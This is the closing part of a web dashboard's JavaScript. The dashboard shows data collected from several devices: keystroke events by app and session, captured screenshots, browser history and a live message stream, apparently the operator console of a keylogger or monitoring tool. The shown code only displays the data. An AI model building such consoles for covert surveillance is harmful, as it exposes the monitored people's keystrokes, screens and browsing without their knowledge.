        copySourceButton.addEventListener('click', async () => {
          try {
            await navigator.clipboard.writeText(msg.source_url);
            copySourceButton.textContent = 'Copied';
            setTimeout(() => { copySourceButton.textContent = 'Copy link'; }, 1400);
          } catch (err) {
            copySourceButton.textContent = 'Select';
          }
        });

        sourceLinkRow.append(sourceLink, copySourceButton);
        bubble.appendChild(sourceLinkRow);
      }

      wrap.appendChild(bubble);
      return wrap;
    }

    function visibleMessages() {
      const search = messageSearchEl.value.trim().toLowerCase();
      const matchesSearch = (msg) => {
        if (!search) return true;
        return [msg.text, msg.raw_text, msg.device_name, msg.device_id, msg.app_name]
          .some((value) => String(value || '').toLowerCase().includes(search));
      };
      if (displayMode === 'raw') {
        const rawMessages = currentMessages.filter((msg) => msg.raw_only && matchesSearch(msg));
        return rawMessages.length ? rawMessages : currentMessages.filter(matchesSearch);
      }
      return currentMessages.filter((msg) => !msg.raw_only && matchesSearch(msg));
    }

    function updateMessageCount() {
      messageCountEl.textContent = visibleMessages().length;
    }

    function queueFeedRender() {
      if (renderQueued) return;
      renderQueued = true;
      requestAnimationFrame(() => {
        renderQueued = false;
        renderFeed();
      });
    }

    function renderFeed() {
      feed.innerHTML = '';
      if (displayMode === 'raw-history') {
        const fragment = document.createDocumentFragment();
        rawHistory.forEach((batch) => {
          const section = document.createElement('section');
          section.className = 'raw-batch';
          const heading = document.createElement('header');
          heading.className = 'raw-batch-heading';
          heading.textContent = `${formatTime(batch.started_at)} - ${formatTime(batch.ended_at)} | ${batch.device_name} | ${batch.event_count} events`;
          const session = document.createElement('span');
          session.textContent = `Session ${batch.session_id}`;
          heading.appendChild(session);
          section.appendChild(heading);
          batch.events.forEach((event) => {
            const row = document.createElement('div');
            row.className = 'raw-event';
            const time = document.createElement('time');
            time.textContent = formatTime(event.time);
            const key = document.createElement('code');
            key.textContent = event.key;
            const app = document.createElement('span');
            app.textContent = event.app_name || 'Unknown app';
            row.append(time, key, app);
            section.appendChild(row);
          });
          fragment.appendChild(section);
        });
        feed.appendChild(fragment);
        messageCountEl.textContent = rawHistory.reduce((count, batch) => count + batch.event_count, 0);
        feed.scrollTop = 0;
        return;
      }
      if (displayMode === 'raw') {
        const rawLog = document.createElement('pre');
        rawLog.className = 'raw-log';
        rawLog.textContent = visibleMessages()
          .map((msg) => msg.raw_text || msg.text)
          .join('');
        feed.appendChild(rawLog);
        updateMessageCount();
        feed.scrollTop = feed.scrollHeight;
        return;
      }
      const fragment = document.createDocumentFragment();
      visibleMessages().forEach((msg) => fragment.appendChild(addMessage(msg)));
      feed.appendChild(fragment);
      updateMessageCount();
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const messages = await fetchJson(`/messages${query}`);
        currentMessages = messages;
        renderFeed();
        statusEl.textContent = selectedDeviceId ? 'Device messages: ' + visibleMessages().length : 'Latest messages: ' + visibleMessages().length;
        return true;
      } catch (err) {
        statusEl.textContent = 'Listening for new messages…';
        return false;
      }
    }

    async function loadRawHistory() {
      const params = new URLSearchParams();
      const deviceId = rawDeviceFilterEl.value.trim() || selectedDeviceId;
      if (deviceId) params.set('device_id', deviceId);
      if (rawSessionFilterEl.value.trim()) params.set('session_id', rawSessionFilterEl.value.trim());
      if (rawStartFilterEl.value) params.set('start_time', String(new Date(rawStartFilterEl.value).getTime()));
      if (rawEndFilterEl.value) params.set('end_time', String(new Date(rawEndFilterEl.value).getTime()));
      params.set('limit', '100');
      try {
        rawHistory = await fetchJson(`/api/raw-history?${params}`);
        renderFeed();
        statusEl.textContent = `Raw history: ${rawHistory.length} batches`;
      } catch (err) {
        rawHistory = [];
        renderFeed();
        statusEl.textContent = 'Raw history unavailable';
      }
    }

    async function loadScreenshots() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const screenshots = await fetchJson(`/api/screenshots${query}`);
        feed.innerHTML = '';
        if (!screenshots.length) {
          feed.innerHTML = '<span class="device-seen">No screenshots saved</span>';
        } else {
          const grid = document.createElement('div');
          grid.className = 'screenshot-grid';
          screenshots.forEach((item) => {
            const card = document.createElement('article');
            card.className = 'screenshot-card';
            const image = document.createElement('img');
            image.src = item.image_url;
            image.alt = `Screenshot from ${item.device_name}`;
            image.loading = 'lazy';
            image.addEventListener('load', () => image.classList.add('loaded'));
            image.addEventListener('error', () => {
              image.classList.add('loaded');
              image.alt = 'Screenshot unavailable';
            });
            image.addEventListener('click', () => window.open(item.image_url, '_blank', 'noopener'));
            const device = document.createElement('strong');
            device.textContent = `${item.device_name} (${item.device_id})`;
            const time = document.createElement('span');
            time.textContent = formatTime(item.captured_at);
            card.append(image, device, time);
            grid.appendChild(card);
          });
          feed.appendChild(grid);
        }
        messageCountEl.textContent = screenshots.length;
        statusEl.textContent = `Screenshots: ${screenshots.length}`;
      } catch (err) {
        feed.innerHTML = '<span class="device-seen">Screenshots unavailable</span>';
        statusEl.textContent = 'Screenshots unavailable';
      }
    }

    async function loadWebsiteHistory() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const entries = await fetchJson(`/api/website-history${query}`);
        feed.innerHTML = '';
        if (!entries.length) {
          feed.innerHTML = '<span class="device-seen">No website history saved</span>';
        } else {
          entries.forEach((entry) => {
            const row = document.createElement('div');
            row.className = 'raw-event';
            const time = document.createElement('time');
            time.textContent = formatTime(entry.visited_at);
            const browser = document.createElement('strong');
            browser.textContent = `${entry.browser} · ${entry.device_name}`;
            const link = document.createElement('a');
            link.href = entry.url;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            link.textContent = entry.url;
            row.append(time, browser, link);
            feed.appendChild(row);
          });
        }
        messageCountEl.textContent = entries.length;
        statusEl.textContent = `Website history: ${entries.length}`;
      } catch (err) {
        feed.innerHTML = '<span class="device-seen">Website history unavailable</span>';
        statusEl.textContent = 'Website history unavailable';
      }
    }

    function connectEvents() {
      const params = new URLSearchParams();
      if (selectedDeviceId) params.set('device_id', selectedDeviceId);
      const lastMessageId = currentMessages.reduce((latest, msg) => Math.max(latest, Number(msg.id) || 0), 0);
      if (lastMessageId) params.set('since', String(lastMessageId));
      const query = params.toString() ? `?${params.toString()}` : '';
      eventSource = new EventSource(`/events${query}`);
      eventSource.onmessage = (event) => {
        currentMessages.push(JSON.parse(event.data));
        if (currentMessages.length > 200) currentMessages.shift();
        queueFeedRender();
        statusEl.textContent = 'Live stream connected';
      };
      eventSource.onerror = () => {
        statusEl.textContent = 'Reconnect in progress…';
      };
    }

    document.querySelectorAll('[data-mode]').forEach((button) => {
      button.addEventListener('click', () => {
        displayMode = button.dataset.mode;
        document.querySelectorAll('[data-mode]').forEach((item) => item.classList.toggle('active', item === button));
        rawHistoryControlsEl.hidden = displayMode !== 'raw-history';
        if (displayMode === 'raw-history') {
          if (eventSource) eventSource.close();
          loadRawHistory();
        } else if (displayMode === 'screenshots') {
          if (eventSource) eventSource.close();
          loadScreenshots();
        } else if (displayMode === 'website-history') {
          if (eventSource) eventSource.close();
          loadWebsiteHistory();
        } else {
          if (!eventSource || eventSource.readyState === EventSource.CLOSED) connectEvents();
          renderFeed();
        }
      });
    });

    rawHistoryControlsEl.addEventListener('submit', (event) => {
      event.preventDefault();
      loadRawHistory();
    });

    messageSearchEl.addEventListener('input', queueFeedRender);
    window.addEventListener('keydown', (event) => {
      if (event.key === '/' && document.activeElement !== messageSearchEl) {
        event.preventDefault();
        messageSearchEl.focus();
      }
    });

    scopeLabelEl.textContent = selectedDeviceId ? `Device ${selectedDeviceId}` : 'All devices';
    async function startApp() {
      await loadInitialMessages();
      connectEvents();
      loadConfig();
      loadHealth();
      loadDevices();
    }

    startApp();
    setInterval(updateUptime, 1000);
    setInterval(updateDeviceUptimes, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 3000);
    setInterval(() => {
      if (displayMode === 'screenshots') loadScreenshots();
      if (displayMode === 'website-history') loadWebsiteHistory();
    }, 3000);
  </script>
</body>
</html>
